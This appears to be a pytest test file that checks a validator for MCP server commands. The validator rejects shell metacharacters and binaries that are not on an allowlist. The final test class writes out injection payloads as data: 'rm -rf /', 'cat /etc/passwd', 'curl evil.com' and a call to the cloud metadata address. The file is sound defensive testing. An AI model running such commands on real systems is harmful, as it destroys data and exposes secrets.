"""Tests for ``runtime.mcp_client._validate_mcp_command``.

Verifies that shell metacharacters, unlisted binaries, and absolute paths
to non-standard locations are rejected — preventing command injection via
MCP server configurations.
"""

from __future__ import annotations

import os
from unittest.mock import patch

import pytest

from runtime.mcp_client import _validate_mcp_command


class TestValidateMcpCommandMetachars:
    """Shell metacharacter rejection in command and args."""

    @pytest.mark.parametrize("metachar", [";", "|", "&", "`", "$", "(", ")", "{", "}", "[", "]", "<", ">", "!", "\n", "\r"])
    def test_command_metachar_rejected(self, metachar: str) -> None:
        with pytest.raises(ValueError, match="shell metacharacter"):
            _validate_mcp_command(f"python{metachar}evil", [])

    @pytest.mark.parametrize("metachar", [";", "|", "&", "`", "$", "(", ")", "{", "}", "[", "]", "<", ">", "!", "\n", "\r"])
    def test_arg_metachar_rejected(self, metachar: str) -> None:
        with pytest.raises(ValueError, match="shell metacharacter"):
            _validate_mcp_command("python", [f"--flag{metachar}evil"])

    def test_non_string_arg_skipped(self) -> None:
        """Non-string args (int, None) should not trigger metachar check."""
        _validate_mcp_command("python", [42, None, True, ["nested"]])


class TestValidateMcpCommandAllowlist:
    """Command basename allowlist enforcement."""

    def test_allowed_command_passes(self) -> None:
        _validate_mcp_command("python", ["-m", "aizee_mcp.aizee_server"])

    def test_allowed_command_with_path_passes(self) -> None:
        _validate_mcp_command("/usr/bin/python3", ["-m", "http.server"])

    def test_unlisted_command_rejected(self) -> None:
        with pytest.raises(ValueError, match="not in the allowlist"):
            _validate_mcp_command("evil_binary", [])

    def test_unlisted_command_allowed_with_env(self) -> None:
        with patch.dict(os.environ, {"AIZEE_MCP_ALLOW_UNLISTED": "1"}):
            _validate_mcp_command("custom_binary", ["--flag"])

    def test_empty_command_rejected(self) -> None:
        with pytest.raises(ValueError, match="empty or not a string"):
            _validate_mcp_command("", [])

    def test_non_string_command_rejected(self) -> None:
        with pytest.raises(ValueError, match="empty or not a string"):
            _validate_mcp_command(123, [])  # type: ignore[arg-type]


class TestValidateMcpCommandInjectionPayloads:
    """Real-world injection payloads that must be blocked."""

    def test_semicolon_injection(self) -> None:
        with pytest.raises(ValueError, match="shell metacharacter"):
            _validate_mcp_command("python; rm -rf /", [])

    def test_ampersand_injection(self) -> None:
        with pytest.raises(ValueError, match="shell metacharacter"):
            _validate_mcp_command("python && cat /etc/passwd", [])

    def test_backtick_injection(self) -> None:
        with pytest.raises(ValueError, match="shell metacharacter"):
            _validate_mcp_command("python`whoami`", [])

    def test_dollar_paren_injection(self) -> None:
        with pytest.raises(ValueError, match="shell metacharacter"):
            _validate_mcp_command("python$(curl evil.com)", [])

    def test_newline_injection(self) -> None:
        with pytest.raises(ValueError, match="shell metacharacter"):
            _validate_mcp_command("python\nevil", [])

    def test_arg_injection_blocked(self) -> None:
        with pytest.raises(ValueError, match="shell metacharacter"):
            _validate_mcp_command("python", ["--config; rm -rf /"])

    def test_arg_subshell_blocked(self) -> None:
        with pytest.raises(ValueError, match="shell metacharacter"):
            _validate_mcp_command("python", ["$(curl http://169.254.169.254)"])
